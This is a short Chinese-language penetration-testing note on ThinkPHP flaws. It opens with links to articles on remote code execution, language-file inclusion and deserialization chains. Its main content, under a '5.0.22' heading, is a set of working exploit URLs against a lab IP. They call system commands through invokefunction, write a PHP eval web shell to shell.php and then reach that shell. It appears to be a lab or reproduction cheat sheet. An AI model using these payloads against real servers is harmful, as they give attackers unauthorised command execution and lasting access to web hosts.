[ThinkPHP框架漏洞总结+Thinkphp自动化武器](https://mp.weixin.qq.com/s/OWmFjra3oZfth0rifK-kYg)
[Thinkphp多语言漏洞自检工具 -- ThinkPhp6LangRce](https://mp.weixin.qq.com/s/a7Zo1GJpJuFGQR2t9m74Zw)
[ThinkPHP 3.1.3 | 某外汇常用CMS通用未授权RCE](https://mp.weixin.qq.com/s/SJ-rCRIkqT3COP9jdKBY_g)
[ThinkPHP远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247485017&idx=1&sn=82730143a26bfb4eeec1d9daa6671d17)
[ThinkPHP 6.x反序列化POP链（一）](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484192&idx=3&sn=1d97d5acb16026cdd2e0600bf3151c2f)
[Thinkphp6-Lang-rce](https://mp.weixin.qq.com/s/7SlTUoeYAtqNhlInz7BGRg)
[ThinkPHP-Lang v6.0.0~v6.0.13 v5.0.0~5.0.12 v5.1.0~5.1.8 Lang文件包含To远程代码执行漏洞复现—CNVD-2022-86535](https://mp.weixin.qq.com/s/8eeQO-3kAtKKTW5H13aabQ)
msf > searchsploit thinkphpk

## 根目录

在 /var/www/html/public

## 5.0.22

```shell
http://192.168.138.136/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[whoami]);?>" > shell.php
http://192.168.138.136/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
http://192.168.138.136/shell.php
```
